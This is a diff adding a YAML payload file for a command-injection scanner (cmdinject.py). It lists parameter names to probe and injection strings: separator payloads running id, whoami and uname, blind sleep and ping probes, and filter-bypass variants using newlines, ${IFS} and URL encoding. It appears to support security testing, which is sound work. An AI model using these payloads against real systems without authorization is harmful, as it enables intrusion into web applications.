@@ -1,0 +1,43 @@
+# Command Injection Detection Payloads
+# Usado por cmdinject.py
+
+cmd_params:
+  - cmd
+  - exec
+  - command
+  - query
+  - input
+  - ping
+  - host
+  - ip
+  - file
+  - path
+  - name
+  - data
+  - run
+  - execute
+  - shell
+
+os_command_payloads:
+  - ["semicolon", "; id"]
+  - ["pipe", "| id"]
+  - ["or", "|| id"]
+  - ["and", "&& id"]
+  - ["backtick", "`id`"]
+  - ["dollar", "$(id)"]
+  - ["whoami", "; whoami"]
+  - ["uname", "; uname -a"]
+
+blind_payloads:
+  - ["sleep_semicolon", "; sleep 5"]
+  - ["sleep_pipe", "| sleep 5"]
+  - ["sleep_dollar", "$(sleep 5)"]
+  - ["ping_semicolon", "; ping -c 5 127.0.0.1"]
+  - ["ping_pipe", "| ping -c 5 127.0.0.1"]
+
+bypass_payloads:
+  - ["newline", "%0a id"]
+  - ["ifs", "${IFS}id"]
+  - ["ifs_tab", "$IFS$id"]
+  - ["backslash", "\\; id"]
+  - ["double_encode", "%3B%20id"]
